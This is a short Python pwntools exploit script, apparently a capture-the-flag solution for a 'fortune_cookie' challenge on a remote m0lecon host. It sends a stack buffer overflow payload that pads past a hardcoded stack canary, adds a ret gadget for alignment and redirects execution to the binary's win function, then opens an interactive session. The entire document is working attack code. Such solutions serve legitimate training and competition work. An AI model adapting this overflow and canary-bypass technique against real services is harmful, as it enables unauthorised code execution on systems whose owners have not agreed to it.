#!/usr/bin/env python3
from pwn import *
import time

HOST, PORT = 'offsec.m0lecon.it', 13547
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP = 88

elf = ELF('./fortune_cookie', checksec=False)


io = remote(HOST, PORT)
io.recvuntil(b"wish\n")

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(0xcad63f47ebc1900),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(0x000000000040101a),    # ret gadget for alignment
    p64(elf.sym.win),
)
io.send(payload)
io.interactive()
